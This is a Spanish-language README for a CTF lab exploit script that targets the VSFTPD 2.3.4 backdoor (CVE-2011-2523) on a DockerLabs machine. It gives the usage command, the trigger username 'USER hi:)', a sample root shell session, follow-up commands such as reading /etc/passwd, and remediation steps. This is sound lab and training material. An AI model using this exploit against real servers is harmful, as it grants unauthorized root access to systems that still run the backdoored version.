# 🔓 Exploit VSFTPD 2.3.4 — CVE-2011-2523

Automatización del ataque al backdoor de VSFTPD 2.3.4 en la máquina **FirstHacking** de DockerLabs.

---

## 🚀 Uso

```bash
python3 exploit.py -host [IP]
```

### Ejemplo

```bash
python3 exploit.py -host 172.17.0.2
```

**Output esperado:**
```
[+] Conexion exitosa a 172.17.0.2:6200 — shell abierta
id
uid=0(root) gid=0(root) groups=0(root)
exit
[+] Sesión cerrada
```

---

## 📋 Contenido

| Archivo | Descripción |
|---------|-----------|
| `exploit.py` | Script Python 3 que automatiza la explotación de CVE-2011-2523 |
| `first_hacking_writeup.md` | Análisis técnico detallado del vulnerabilidad y metodología manual |
| `README.md` | Este archivo (guía de uso) |

---

## 🎯 ¿Qué hace el exploit?

El script automatiza los siguientes pasos:

1. ✅ **Conexión Telnet al puerto FTP (21)** - Se conecta al servidor destino
2. ✅ **Activación del backdoor** - Envía `USER hi:)` para activar el backdoor
3. ✅ **Pausa de 3 segundos** - Permite que el servidor abra la shell en puerto 6200
4. ✅ **Conexión a puerto 6200** - Se conecta como root y abre una shell interactiva
5. ✅ **Interacción en tiempo real** - Envía/recibe comandos hasta escribir `exit`

---

## 🔧 Cómo funciona técnicamente

### El backdoor — CVE-2011-2523

La versión **vsftpd 2.3.4** contiene un backdoor inyectado:

- **Condición de activación:** Usuario que termina en `:)` (carita feliz)
- **Acción:** Abre una shell como `root` en puerto `6200`
- **Autenticación:** No requiere validación adicional

### Requisitos

- Python 3.6+
- Acceso de red a puerto 21 y 6200 del objetivo
- Módulos estándar: `telnetlib`, `socket`, `select`

---

## 📊 Comandos útiles en la shell

Una vez dentro con acceso root:

```bash
id                      # Ver ID de usuario
cat /root/flag.txt      # Obtener la flag
ls -la /root            # Listar directorio
cat /etc/passwd         # Ver usuarios del sistema
ip addr                 # Información de red
```

---

## ⚠️ Limitaciones

| Aspecto | Descripción |
|---------|-----------|
| **Timeout** | Si tarda >3 seg en abrir puerto 6200, aumentar `time.sleep(3)` |
| **Sin prompt** | La shell no muestra `$` ni `#`, pero funciona |
| **Reconexión** | Si se desconecta, ejecutar el exploit nuevamente |
| **Sistema operativo** | Testeado en sistemas Unix/Linux |

---

## 🛡️ Remediación

1. **Actualizar VSFTPD** a versión ≥ 2.3.5
2. **Usar SFTP** en lugar de FTP
3. **Restringir acceso FTP** con firewall
4. **Monitorear puerto 6200** en IDS/IPS

---

## 📚 Referencias

- [CVE-2011-2523 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Scary Beast Security — VSFTPD Backdoor](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)

---

## 📝 Autor

**Fares Zuleta**  
**Fecha:** 2026-06-12  
**Dificultad:** ⭐ Muy fácil
